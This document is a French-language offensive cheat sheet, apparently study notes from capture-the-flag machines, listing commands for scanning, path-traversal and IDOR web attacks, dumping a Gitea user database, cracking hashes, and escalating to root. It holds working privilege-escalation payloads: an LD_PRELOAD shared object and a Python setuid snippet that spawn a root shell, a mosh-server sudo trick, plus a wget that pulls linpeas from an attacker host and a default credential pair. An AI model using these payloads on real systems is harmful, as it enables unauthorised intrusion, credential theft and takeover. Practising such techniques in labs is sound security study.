# 🛠️ Cheat Sheet — Techniques & Outils

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- -oN scan.txt <ip>     # Scan TCP complet avec scripts par défaut
nmap -sU <ip>                          # Scan UDP (top ports)
snmpwalk -v2c -c public <ip>          # Enumération SNMP
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Inspection manuelle : robots.txt, sitemap.xml

## 🐚 Exploitation Web

LFI (Local File Inclusion)
```bash
../../../../etc/passwd
%2e%2e%2f        # Encodage URL pour contourner les filtres
```
Téléchargement de fichiers via curl ou navigateur
IDOR (Insecure Direct Object Reference)
Manipulation d’ID dans une URL :
```bash
http://<ip>/data?id=1
```
## 🗃️ SQLite3
```bash
sqlite3 gitea.db
.tables                         # Lister les tables
SELECT * FROM user;            # Récupérer les utilisateurs
```
## 🔐 Crack de mots de passe

Format Hashcat avec salt :
```bash
username:$dynamic_61$salt$hash
hashcat -m 20 -a 0 hash.txt wordlist.txt
John the Ripper
john --format=raw-md5 hash.txt --wordlist=rockyou.txt
```

## 🔑 SSH
```bash
ssh user@ip
```
## 🚀 Privesc (Linux)

Enumération :
```bash
sudo -l      # Liste des commandes sudo accessibles
LD_PRELOAD
```
### 1. Code C (shell.c) :
```bash
void _init() {
    setuid(0);
    system("/bin/bash");
}
```
### 2. Compilation :
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
### 3. Exécution :
```bash
LD_PRELOAD=./shell.so sudo <commande_vulnérable>
SetUID Python :
import os
os.setuid(0)
os.system("/bin/bash")
mosh-server
mosh --server="sudo /usr/bin/mosh-server" localhost
```
## 🔄 Transfert de fichiers

Depuis Attaquant :
```bash
python3 -m http.server 8000
```
Depuis Cible :
```bash
wget http://<attacker-ip>:8000/linpeas.sh
```
## 🔍 Analyse de configuration

Analyse de Dockerfile, .yml → chemins d’accès (/var/www/daloradius)
URLs cachées dans les configs :
/daloradius/app/operators/login.php

## 🔑 Credential Discovery

Bruteforce simple : administrator:radius
## 🧰 Outils utilisés

Recon : nmap, snmpwalk
Crack : john, hashcat
Analyse réseau : wireshark, .pcap
Privesc : linpeas.sh, mosh
Transfert : wget, python3 -m http.server
Accès distant : ssh, mosh